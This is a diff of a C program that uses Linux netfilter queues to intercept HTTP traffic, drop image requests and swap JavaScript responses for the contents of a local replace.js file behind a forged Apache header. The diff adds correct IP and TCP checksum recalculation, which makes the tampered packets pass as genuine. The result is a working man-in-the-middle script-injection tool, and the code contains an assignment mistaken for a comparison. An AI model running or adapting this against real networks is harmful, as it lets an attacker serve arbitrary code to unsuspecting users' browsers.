@@ -3,7 +3,7 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <linux/types.h>
-#include <linux/netfilter.h>  /* for NF_ACCEPT / NF_DROP */
+#include <linux/netfilter.h>
 #include <errno.h>
 
 #include <linux/ip.h>
@@ -15,17 +15,53 @@
 #include <string.h>
 #include <time.h>
 
-struct my_data {
+#define COLOR_RST     "\033[0m" /* Color Reset */
+#define COLOR_RED     "\033[1m\033[31m" /* Red */
+
+struct data {
 	unsigned char *data;
 	int data_len;
 };
+
+uint16_t cksum(uint32_t sum, uint16_t *buf, int size)
+{
+	while (size > 1) {
+		sum += *(buf++);
+		size -= sizeof(uint16_t);
+	}
+	if (size) {
+		sum += *(uint8_t *)buf;
+	}
+
+	sum = (sum >> 16) + (sum & 0xffff);
+	sum += (sum >> 16);
+	return (uint16_t)(~sum);
+}
+
+uint16_t cksum_tcp(struct iphdr *iph)
+{
+	uint32_t sum = 0;
+	uint32_t iph_len = iph->ihl * 4;
+	uint32_t len = ntohs(iph->tot_len) - iph_len;
+	uint8_t *payload = (uint8_t *)iph + iph_len;
+
+	sum += (iph->saddr >> 16) & 0xFFFF;
+	sum += (iph->saddr) & 0xFFFF;
+	sum += (iph->daddr >> 16) & 0xFFFF;
+	sum += (iph->daddr) & 0xFFFF;
+	sum += htons(IPPROTO_TCP);
+	sum += htons(len);
+
+	return cksum(sum, (uint16_t *)payload, len);
+}
 
 char *http_time() 
 {
 	static char buf[1024];
 	time_t now = time(0);
 	struct tm *tm = gmtime(&now);
-	strftime(buf, sizeof(buf), "%a, %d %b %Y %H:%M:%S %Z", tm);
+	strftime(buf, sizeof(buf), 
+	         "%a, %d %b %Y %H:%M:%S %Z", tm);
 	return buf;
 }
 
@@ -36,18 +72,25 @@ char *http_header(int http_len)
 	       "HTTP/1.1 200 OK\r\n"
 	       "Date: %s\r\n"
 	       "Server: Apache/2.4.7 (Ubuntu)\r\n"
+	       "Last-Modified: Wed, 05 Aug 2015 16:40:52 GMT\r\n"
+	       "ETag: \"11-51c9310dca9b7\"\r\n"
+	       "Accept-Ranges: bytes\r\n"
 	       "Content-Length: %d\r\n"
 	       "Content-Type: application/javascript\r\n"
 	       "\r\n", http_time(), http_len);
 	return header;
 }
 
-static void my_print_ip_hdr(struct iphdr *iph)
+static void print_ip_hdr(struct iphdr *iph)
 {
 	// display IP HEADERS : ip.h line 45
-	fprintf(stdout, "IP{v=%u; ihl=%u; tos=%u; tot_len=%u; id=%u; ttl=%u; protocol=%u; ",
-	                 iph->version, iph->ihl * 4, iph->tos, ntohs(iph->tot_len), 
-	                 ntohs(iph->id), iph->ttl, iph->protocol);
+	fprintf(stdout, "IP{v=%u; ihl=%u; tos=%u; tot_len=%u; "
+	                "id=%u; frag_off=%u; ttl=%u; protocol=%u; "
+	                COLOR_RED "checksum=%x; " COLOR_RST,
+	                 iph->version, iph->ihl * 4, iph->tos, 
+	                 ntohs(iph->tot_len), ntohs(iph->id), 
+	                 iph->frag_off, iph->ttl, iph->protocol, 
+	                 iph->check);
 
 	char *saddr = inet_ntoa(*(struct in_addr *)&iph->saddr);
 	fprintf(stdout,"saddr=%s; ",saddr);
@@ -56,73 +99,79 @@ static void my_print_ip_hdr(struct iphdr *iph)
 	fprintf(stdout,"daddr=%s}\n",daddr);
 }
 
-static void my_print_tcp_hdr(struct tcphdr *tcp)
+static void print_tcp_hdr(struct tcphdr *tcp)
 {
-	fprintf(stdout, "TCP{sport=%u; dport=%u; seq=%u; ack_seq=%u; flags=u%ua%up%ur%us%uf%u;"
-	        " window=%u; urg=%u, header_len=%u}\n",
-	        ntohs(tcp->source), ntohs(tcp->dest), ntohl(tcp->seq), ntohl(tcp->ack_seq),
-	        tcp->urg, tcp->ack, tcp->psh, tcp->rst, tcp->syn, tcp->fin, 
-	        ntohs(tcp->window), tcp->urg_ptr, tcp->doff * 4);
+	fprintf(stdout, "TCP{sport=%u; dport=%u; seq=%u; "
+	                "ack_seq=%u; flags=u%ua%up%ur%us%uf%u; "
+	                "window=%u; urg=%u, header_len=%u, "
+	                COLOR_RED "checksum=%x" COLOR_RST "}\n",
+	        ntohs(tcp->source), ntohs(tcp->dest), 
+	        ntohl(tcp->seq), ntohl(tcp->ack_seq), tcp->urg, 
+	        tcp->ack, tcp->psh, tcp->rst, tcp->syn, tcp->fin, 
+	        ntohs(tcp->window), tcp->urg_ptr, tcp->doff * 4, 
+	        tcp->check);
 }
 
-int my_print_non_0_http(unsigned char *data, int data_len)
+int print_non_0_http(unsigned char *data, int data_len)
 {
-	struct iphdr * iph = (struct iphdr *)data;	
+	struct iphdr * iph = (struct iphdr *)data;
 	if (iph->protocol = IPPROTO_TCP) { 
-		/* Skip the size of the IP Header. iph->ihl contains the number of 32 bit
-		   words that represent the header size. Therfore to get the number of bytes
-		   multiple this number by 4 */
-		// The number of 32 bit words in the tcp header which will most probably be 
-		// five (5) unless you use options.
-		struct tcphdr *tcp = ((struct tcphdr *) (data + (iph->ihl << 2)));
+		/* 
+		 * iph->ihl contains the number of 32 bit words that 
+		 * represent the header size. The number of 32 bit 
+		 * words in the tcp header which will most probably be 
+		 * five (5) unless you use options. */
+		struct tcphdr *tcp = ((struct tcphdr *) 
+		                      (data + (iph->ihl << 2)));
 
 		char *http = ((char *)tcp + (tcp->doff << 2));
-		int http_payload_len = ntohs(iph->tot_len) - iph->ihl * 4 - tcp->doff * 4; 
+		int tcp_payload_len = ntohs(iph->tot_len) 
+		                    - iph->ihl * 4 - tcp->doff * 4; 
 
-		if (http_payload_len == 0)
+		if (tcp_payload_len == 0)
 			return 0;
 
 		if (data_len != ntohs(iph->tot_len)) {
-			printf("<<<<<<<<<<<<<<\n");
-			printf("bad!\n");
-			printf(">>>>>>>>>>>>>>\n");
+			printf("error @ line %d!\n", __LINE__);
 			return 0;
 		}
-		printf("total len: reported:%d / header:%d \n", data_len, ntohs(iph->tot_len));
-		my_print_ip_hdr(iph);
-		my_print_tcp_hdr(tcp);
-		printf("payload (len=%d):\n", http_payload_len);
+
+		printf("\n");
+		printf("IP packet len: %d\n", data_len);
+		print_ip_hdr(iph);
+		print_tcp_hdr(tcp);
+		printf("TCP payload (len=%d):\n", tcp_payload_len);
 		int i;
-		for (i = 0; i < http_payload_len; i++) {
+		for (i = 0; i < tcp_payload_len; i++) {
 			if (http[i] == '\r')
 				printf("\\r");
 			else
 				printf("%c", http[i]);
 		}
-		printf("\n~~END~~\n");
+		printf("\n");
 
-		return data_len - http_payload_len;
+		return data_len - tcp_payload_len;
 	}
 	return 0;
 }
 
-char *my_http_copy(unsigned char *data, int data_len, int offset)
+char *copy_http_str(unsigned char *data, int len, int offset)
 {
 	char *http = (char *)data + offset;
-	int http_payload_len = data_len - offset; 
+	int tcp_payload_len = len - offset; 
 
-	char *http_copy = malloc(http_payload_len + 1);
+	char *http_copy = malloc(tcp_payload_len + 1);
 	int i;
-	for (i = 0; i < http_payload_len; i++) {
+	for (i = 0; i < tcp_payload_len; i++) {
 		http_copy[i] = http[i];
 	}
 	http_copy[i] = '\0';
 	return http_copy;
 }
 
-struct my_data my_read_file(const char *fname)
+struct data read_file(const char *fname)
 {
-	struct my_data res = {NULL, 0};
+	struct data res = {NULL, 0};
 	FILE *fh = fopen(fname, "r");
 
 	if (fh == NULL)
@@ -140,14 +189,15 @@ struct my_data my_read_file(const char *fname)
 	return res;
 }
 
-struct my_data my_replace_http(unsigned char *data, const char *fname)
+struct data replace_http(unsigned char *data, const char *fname)
 {
-	struct my_data res, http_content = my_read_file(fname);
+	struct data res, http_content = read_file(fname);
 	if (http_content.data == NULL)
 		return http_content;
 
 	struct iphdr *iph = (struct iphdr *)data;
-	struct tcphdr *tcp = ((struct tcphdr *) (data + (iph->ihl << 2)));
+	struct tcphdr *tcp = ((struct tcphdr *) 
+	                      (data + (iph->ihl << 2)));
 	int ip_len = ntohs(iph->tot_len);
 	int ip_hdr_len = iph->ihl * 4;
 	int http_offset = ip_hdr_len + tcp->doff * 4;
@@ -155,7 +205,8 @@ struct my_data my_replace_http(unsigned char *data, const char *fname)
 	char *http_hdr = http_header(http_content.data_len);
 	int http_hdr_len = strlen(http_hdr);
 
-	res.data_len = http_offset + http_hdr_len + http_content.data_len;
+	res.data_len = http_offset + http_hdr_len 
+	                           + http_content.data_len;
 	res.data = malloc(res.data_len);
 
 	memcpy(res.data, data, http_offset);
@@ -165,53 +216,61 @@ struct my_data my_replace_http(unsigned char *data, const char *fname)
 
 	free(http_content.data);
 	
+	printf("injecting...\n");
 	struct iphdr *new_iph = (struct iphdr *)res.data;
 	new_iph->tot_len = htons(res.data_len);
-	new_iph->check = 0xdeaf;
+	printf("[old IP checksum: 0x%x]\n", 
+	       cksum(0, (uint16_t *)iph, ip_hdr_len));
+	new_iph->check = 0x00;
+	new_iph->check = cksum(0, (uint16_t *)new_iph, ip_hdr_len);
+	printf("[new IP checksum: 0x%x]\n", new_iph->check);
 
-	struct tcphdr *new_tcp = ((struct tcphdr *)(res.data + (new_iph->ihl << 2)));
-	new_tcp->check = 0xbad1;
+	struct tcphdr *new_tcp = ((struct tcphdr *)
+	                          (res.data + (new_iph->ihl << 2)));
+	printf("[old TCP checksum: 0x%x]\n", cksum_tcp(iph));
+	new_tcp->check = 0x00;
+	new_tcp->check = cksum_tcp(new_iph);
+	printf("[new TCP checksum: 0x%x]\n", new_tcp->check);
 
 	return res;
 }
 
-int my_http_filter(struct nfq_q_handle *qh, uint32_t id,
+int http_filter(struct nfq_q_handle *qh, uint32_t id,
                    unsigned char *data, int data_len)
 {
-	int offset = my_print_non_0_http(data, data_len);
+	int offset = print_non_0_http(data, data_len);
 	char *http_copy;
 	int verdict;
+	struct data res = {NULL, 0};
 
 	if (offset > 0) { 
 		// printf("http copy:\n%s--------\n", http_copy);
-		http_copy = my_http_copy(data, data_len, offset);
-	
-		/* block all .png file requests */
+		http_copy = copy_http_str(data, data_len, offset);
+
 		if (strstr(http_copy, ".png HTTP/1.1")) {
+			/* blocking requests */
 			printf("[blocked]\n");
 			verdict = nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
-		/* modify all .css file requests */
+
 		} else if (strstr(http_copy, "application/javascript")) {
-			struct my_data res = {NULL, 0};
-			res = my_replace_http(data, "replace.js");
+			/* replacing requests */
+			res = replace_http(data, "replace.js");
+
 			if (res.data == NULL) {
-				printf("[modification failed]\n");
-				verdict =  nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+				printf("error @ line %d!\n", __LINE__);
+				verdict = nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 			} else {
-#if 1
-				printf("[modifying]\n");
-				my_print_non_0_http(res.data, res.data_len);
-				printf("[modified]\n");
+				print_non_0_http(res.data, res.data_len);
+
+				printf("[replaced]\n");
 				verdict = nfq_set_verdict(qh, id, NF_ACCEPT, 
 				                          res.data_len, res.data);
-#else
-				printf("[accepted]\n");
-				verdict =  nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
-#endif
-				free(res.data);
 			}
-		/* accept other requests */
+
+			free(res.data);
+
 		} else {
+			/* accepting requests */
 			printf("[accepted]\n");
 			verdict =  nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 		}
@@ -224,7 +283,7 @@ int my_http_filter(struct nfq_q_handle *qh, uint32_t id,
 }
 
 /* returns packet id */
-static uint32_t my_get_packet_id(struct nfq_data *tb)
+static uint32_t get_packet_id(struct nfq_data *tb)
 {
 	int id = 0;
 	struct nfqnl_msg_packet_hdr *ph;
@@ -242,14 +301,14 @@ static uint32_t my_get_packet_id(struct nfq_data *tb)
 }
 	
 
-static int my_callbk(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+static int callbk(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                      struct nfq_data *nfa, void *d)
 {
 	unsigned char *data;
 	int data_len;
 	data_len = nfq_get_payload(nfa, &data);	
-	uint32_t id = my_get_packet_id(nfa);
-	return my_http_filter(qh, id, data, data_len);
+	uint32_t id = get_packet_id(nfa);
+	return http_filter(qh, id, data, data_len);
 }
 
 int main(int argc, char **argv)
@@ -276,20 +335,20 @@ int main(int argc, char **argv)
 		exit(1);
 	}
 
-	printf("unbinding existing nf_queue handler for AF_INET (if any)\n");
+	printf("unbinding existing nf_queue for AF_INET (if any)\n");
 	if (nfq_unbind_pf(h, AF_INET) < 0) {
 		fprintf(stderr, "error during nfq_unbind_pf()\n");
 		exit(1);
 	}
 
-	printf("binding nfnetlink_queue as nf_queue handler for AF_INET\n");
+	printf("binding nfnetlink_queue for AF_INET\n");
 	if (nfq_bind_pf(h, AF_INET) < 0) {
 		fprintf(stderr, "error during nfq_bind_pf()\n");
 		exit(1);
 	}
 
 	printf("binding this socket to queue '%d'\n", queue);
-	qh = nfq_create_queue(h, queue, &my_callbk, NULL);
+	qh = nfq_create_queue(h, queue, &callbk, NULL);
 	if (!qh) {
 		fprintf(stderr, "error during nfq_create_queue()\n");
 		exit(1);
@@ -311,13 +370,10 @@ int main(int argc, char **argv)
 			nfq_handle_packet(h, buf, rv);
 			continue;
 		}
+
 		/* if your application is too slow to digest the packets that
 		 * are sent from kernel-space, the socket buffer that we use
-		 * to enqueue packets may fill up returning ENOBUFS. Depending
-		 * on your application, this error may be ignored. Please, see
-		 * the doxygen documentation of this library on how to improve
-		 * this situation.
-		 */
+		 * to enqueue packets may fill up returning ENOBUFS.  */
 		if (rv < 0 && errno == ENOBUFS) {
 			printf("losing packets!\n");
 			continue;
@@ -331,23 +387,5 @@ int main(int argc, char **argv)
 
 	printf("closing library handle\n");
 	nfq_close(h);
-
-	exit(0);
-}
-
-int _main()
-{
-//	struct my_data res;
-//	res = my_read_file("replace.js");
-//
-//	if (res.data == NULL) {
-//		printf("NULL!\n");
-//	} else {
-//		printf("%s", res.data);
-//	}
-//
-//	free(res.data);
-
-	printf("%s\n", http_header(123));
 	return 0;
 }
